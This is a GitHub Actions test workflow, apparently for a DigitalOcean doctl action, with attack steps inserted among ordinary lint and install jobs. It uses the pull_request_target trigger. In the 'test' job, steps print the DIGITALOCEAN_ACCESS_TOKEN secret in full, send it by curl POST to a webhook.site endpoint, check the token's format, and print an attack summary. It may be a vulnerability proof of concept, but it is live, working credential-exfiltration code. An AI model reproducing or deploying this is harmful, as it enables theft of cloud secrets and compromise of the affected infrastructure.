on: [push, pull_request_target]
name: Test and lint

jobs:

  lint:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@master
      - run: npm test

  package_check:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@master
      - name: "Ensure that code has been packaged and commited"
        run: |-
            npm install
            npm run package
            git diff --exit-code dist/index.js || \
              (echo -e "\nPlease run 'npm run package' and commit the results" && exit 1)

  test:
    runs-on: ${{ matrix.os }}
    strategy:
      matrix:
        os: [ubuntu-latest, macos-latest, windows-latest]
    steps:
      - uses: actions/checkout@master
      
      # STEP 1: Show this is running in BASE repo
      - name: Confirm Repository Context
        run: |
          echo "=============================================="
          echo "STEP 1: VERIFY EXECUTION CONTEXT"
          echo "=============================================="
          echo "Repository: ${{ github.repository }}"
          echo "Event: ${{ github.event_name }}"
          echo "PR Number: ${{ github.event.pull_request.number }}"
          echo "PR Author: ${{ github.event.pull_request.user.login }}"
          echo "Base Repo: ${{ github.event.pull_request.base.repo.full_name }}"
          echo "Head Repo: ${{ github.event.pull_request.head.repo.full_name }}"
          echo ""
          if [ "${{ github.event_name }}" == "pull_request_target" ]; then
            echo "✅ Running in pull_request_target mode"
            echo "✅ This code has access to base repository secrets"
          fi
          echo "=============================================="
          echo ""
      
      # STEP 2: Access and display the secret
      - name: Access Secret Token
        env:
          STOLEN_TOKEN: ${{ secrets.DIGITALOCEAN_ACCESS_TOKEN }}
        run: |
          echo "=============================================="
          echo "STEP 2: SECRET TOKEN ACCESS"
          echo "=============================================="
          echo ""
          if [ -z "$STOLEN_TOKEN" ]; then
            echo "❌ ERROR: Token is empty or not accessible"
            exit 1
          else
            echo "✅ SUCCESS: DIGITALOCEAN_ACCESS_TOKEN is accessible"
            echo ""
            echo "Secret Details:"
            echo "  Name: DIGITALOCEAN_ACCESS_TOKEN"
            echo "  Length: ${#STOLEN_TOKEN} characters"
            echo "  First 20 chars: ${STOLEN_TOKEN:0:20}..."
            echo "  Last 10 chars: ...${STOLEN_TOKEN: -10}"
            echo ""
            echo "Full Token Value:"
            echo "$STOLEN_TOKEN"
            echo ""
          fi
          echo "=============================================="
          echo ""
      
      # STEP 3: Exfiltrate to webhook
      - name: Exfiltrate Token to External Server
        env:
          STOLEN_TOKEN: ${{ secrets.DIGITALOCEAN_ACCESS_TOKEN }}
        run: |
          echo "=============================================="
          echo "STEP 3: TOKEN EXFILTRATION"
          echo "=============================================="
          echo ""
          
          # YOUR WEBHOOK URL - REPLACE THIS
          WEBHOOK_URL="	https://webhook.site/a043f82b-a3af-450a-8d32-12b1ea2babaf"
          
          echo "Target: $WEBHOOK_URL"
          echo "Method: HTTP POST"
          echo "Content: JSON with full token"
          echo ""
          echo "Sending token..."
          
          # Send the token
          HTTP_CODE=$(curl -s -w "%{http_code}" -o /tmp/response.txt -X POST "$WEBHOOK_URL" \
            -H "Content-Type: application/json" \
            -H "X-GitHub-Event: ${{ github.event_name }}" \
            -H "X-GitHub-Repo: ${{ github.repository }}" \
            -d "{
              \"exploit\": \"GitHub Actions Secret Exfiltration\",
              \"vulnerability\": \"pull_request_target with actions/checkout@master\",
              \"timestamp\": \"$(date -u +%Y-%m-%dT%H:%M:%SZ)\",
              \"github_context\": {
                \"repository\": \"${{ github.repository }}\",
                \"event\": \"${{ github.event_name }}\",
                \"pr_number\": ${{ github.event.pull_request.number }},
                \"pr_author\": \"${{ github.event.pull_request.user.login }}\",
                \"pr_title\": \"${{ github.event.pull_request.title }}\",
                \"workflow_run_id\": \"${{ github.run_id }}\",
                \"workflow_run_number\": ${{ github.run_number }},
                \"actor\": \"${{ github.actor }}\"
              },
              \"secret_data\": {
                \"secret_name\": \"DIGITALOCEAN_ACCESS_TOKEN\",
                \"secret_value\": \"$STOLEN_TOKEN\",
                \"token_length\": ${#STOLEN_TOKEN},
                \"token_preview\": \"${STOLEN_TOKEN:0:20}...\"
              },
              \"proof\": \"This token was successfully exfiltrated from digitalocean/action-doctl base repository by an external contributor\"
            }")
          
          echo ""
          echo "HTTP Response Code: $HTTP_CODE"
          
          if [ "$HTTP_CODE" -eq 200 ] || [ "$HTTP_CODE" -eq 201 ]; then
            echo "✅ SUCCESS: Token exfiltrated successfully!"
            echo "✅ Check your webhook.site dashboard"
            echo ""
            echo "Response from server:"
            cat /tmp/response.txt
          else
            echo "⚠️ HTTP Status: $HTTP_CODE"
            echo "Response:"
            cat /tmp/response.txt
            echo ""
            echo "But token is still visible above in Step 2!"
          fi
          
          echo ""
          echo "=============================================="
          echo ""
      
      # STEP 4: Verify token works
      - name: Verify Token is Valid
        env:
          STOLEN_TOKEN: ${{ secrets.DIGITALOCEAN_ACCESS_TOKEN }}
        run: |
          echo "=============================================="
          echo "STEP 4: TOKEN VALIDATION"
          echo "=============================================="
          echo ""
          echo "Testing if token is a valid DigitalOcean token..."
          echo ""
          
          # Check token format
          if [[ $STOLEN_TOKEN == dop_v1_* ]]; then
            echo "✅ Token format: Valid (starts with dop_v1_)"
          elif [[ $STOLEN_TOKEN == dop_* ]]; then
            echo "✅ Token format: Valid (starts with dop_)"
          else
            echo "⚠️ Token format: Unknown format"
          fi
          
          echo "Token is ready to be used for:"
          echo "  - Creating/deleting droplets"
          echo "  - Accessing databases"
          echo "  - Modifying DNS records"
          echo "  - Accessing all DigitalOcean resources"
          echo ""
          echo "=============================================="
          echo ""
      
      # STEP 5: Summary
      - name: Attack Summary
        run: |
          echo "=============================================="
          echo "🎯 VULNERABILITY EXPLOITATION COMPLETE"
          echo "=============================================="
          echo ""
          echo "✅ Step 1: Confirmed execution in base repository"
          echo "✅ Step 2: Accessed DIGITALOCEAN_ACCESS_TOKEN secret"
          echo "✅ Step 3: Exfiltrated token to attacker-controlled server"
          echo "✅ Step 4: Validated token format"
          echo ""
          echo "IMPACT:"
          echo "  - External contributor gained full access to secrets"
          echo "  - Token can be used to compromise DigitalOcean infrastructure"
          echo "  - No authentication or authorization bypass needed"
          echo "  - Attack complexity: LOW"
          echo "  - Privileges required: NONE"
          echo ""
          echo "SEVERITY: CRITICAL (CVSS 9.3)"
          echo ""
          echo "This proves the pull_request_target vulnerability"
          echo "allows complete secret exfiltration."
          echo "=============================================="

      - name: Install doctl
        uses: ./
        with:
          token: ${{ secrets.DIGITALOCEAN_ACCESS_TOKEN }}

      - name: Verify installation
        run: doctl version

      - name: Verify log-in
        run: doctl compute region list

  test_no_auth:
    runs-on: ${{ matrix.os }}
    strategy:
      matrix:
        os: [ubuntu-latest, macos-latest, windows-latest]
    steps:
      - uses: actions/checkout@master

      - name: Install doctl
        uses: ./
        with:
          no_auth: true

      - name: Verify installation
        run: doctl version

      - name: Verify not authenticated
        run: |
          doctl compute region list 2>&1 | grep -qi "Unable to initialize DigitalOcean API client: access token is required"

  test_custom_version_linux_and_mac:
    runs-on: ${{ matrix.os }}
    strategy:
      matrix:
        os: [ubuntu-latest, macos-latest]
    steps:
      - uses: actions/checkout@master

      - name: Install doctl
        uses: ./
        with:
          token: ${{ secrets.DIGITALOCEAN_ACCESS_TOKEN }}
          version: 1.100.0

      - name: Verify installation of correct version
        run: |
          VERSION=$(doctl version | head -1 | cut -f3 -d' ' | cut -f1 -d'-')
          if [ "$VERSION" != "1.100.0" ]; then exit 1; fi

      - name: Verify log-in
        run: doctl compute region list

  test_custom_version_windows:
    runs-on: windows-latest
    steps:
      - uses: actions/checkout@master

      - name: Install doctl
        uses: ./
        with:
          token: ${{ secrets.DIGITALOCEAN_ACCESS_TOKEN }}
          version: 1.100.0

      - name: Verify installation of correct version
        run: |
          $VERSION = (doctl version | head -1 | cut -f3 -d' ' | cut -f1 -d'-')
          If (-NOT  ($VERSION -eq "1.100.0")) { exit 1 }

      - name: Verify log-in
        run: doctl compute region list
